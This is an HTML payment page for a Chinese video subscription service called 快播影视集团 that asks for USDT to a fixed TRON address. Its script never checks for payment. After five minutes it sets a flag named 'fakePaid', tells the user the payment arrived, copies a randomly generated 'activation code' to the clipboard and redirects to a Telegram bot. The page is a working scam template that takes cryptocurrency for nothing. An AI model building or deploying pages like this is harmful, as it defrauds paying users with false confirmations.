<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>快播影视集团</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
  background:#f4f6f9;
}
.header{
  background:#0f172a;
  color:#fff;
  padding:14px;
  text-align:center;
  font-size:18px;
  font-weight:600;
}
.wrap{
  max-width:520px;
  margin:0 auto;
  padding:12px;
}
.card{
  background:#fff;
  border-radius:14px;
  padding:14px;
  box-shadow:0 8px 20px rgba(0,0,0,.08);
}
select,button{
  width:100%;
  padding:14px;
  margin-top:10px;
  font-size:16px;
  border-radius:12px;
  border:1px solid #cbd5e1;
}
button{
  background:#2563eb;
  color:#fff;
  border:none;
}
.info{display:none;margin-top:10px}
.price{font-size:20px;font-weight:700;color:#16a34a;margin-top:6px}
.addr{background:#f1f5f9;padding:10px;border-radius:10px;font-size:13px;word-break:break-all;margin-top:6px}
.qr{display:block;margin:12px auto;width:180px;height:180px}
.notice{font-size:13px;color:#64748b;margin-top:8px;line-height:1.4}
.codebox{display:none;margin-top:12px;background:#ecfdf5;border:1px solid #a7f3d0;border-radius:12px;padding:12px;text-align:center}
</style>
</head>

<body>

<div class="header">快播影视集团</div>

<div class="wrap">
  <div class="card">
    <select id="pkg">
      <option value="">请选择套餐</option>
      <option value="15">套餐一</option>
      <option value="76">套餐二</option>
      <option value="76">套餐三</option>
      <option value="160">SVIP</option>
    </select>

    <div class="info" id="info">
      <div id="desc">套餐描述：测试</div>
      <div class="price">应付金额：<span id="amount"></span> USDT</div>

      <div class="notice">收款地址</div>
      <div class="addr">TAtCo8tFQQ4fJta9EHnU6m6uEsDp8sdSy7</div>

      <img id="qr" class="qr">

      <div class="notice" id="status">
        正在检查是否到账，请在30分钟内付款
      </div>

      <button id="paid">我已付款</button>

      <div class="codebox" id="codebox">
        已确认到账，激活码已复制，即将跳转…
      </div>
    </div>
  </div>
</div>

<script>
(function(){
  var pkg=document.getElementById('pkg');
  var info=document.getElementById('info');
  var amount=document.getElementById('amount');
  var qr=document.getElementById('qr');
  var status=document.getElementById('status');
  var codebox=document.getElementById('codebox');
  var paid=document.getElementById('paid');

  var fakePaid=false;
  var timer=null;

  function genCode(){
    var s='',c='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    for(var i=0;i<16;i++) s+=c[Math.floor(Math.random()*c.length)];
    return s;
  }

  pkg.onchange=function(){
    if(!this.value){
      info.style.display='none';
      return;
    }
    var base=parseFloat(this.value);
    var rand=Math.floor(Math.random()*1000)/1000;
    var payAmount=(base+rand).toFixed(3);

    amount.innerHTML=payAmount;
    info.style.display='block';
    codebox.style.display='none';
    fakePaid=false;

    var addr='TAtCo8tFQQ4fJta9EHnU6m6uEsDp8sdSy7';
    qr.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='
      +encodeURIComponent('tron:'+addr+'?amount='+payAmount+'&token=USDT');

    status.innerHTML='正在检查是否到账，请在30分钟内付款';

    if(timer) clearTimeout(timer);
    timer=setTimeout(function(){
      fakePaid=true;
      status.innerHTML='已检测到到账，请点击“我已付款”';
    },300000); // 5 分钟
  };

  paid.onclick=function(){
    if(!fakePaid){
      status.innerHTML='请稍后，正在同步付款状态…';
      return;
    }
    var code=genCode();
    if(navigator.clipboard){
      navigator.clipboard.writeText(code);
    }
    codebox.style.display='block';
    setTimeout(function(){
      location.href='https://t.me/okklike_bot';
    },1200);
  };
})();
</script>

</body>
</html>
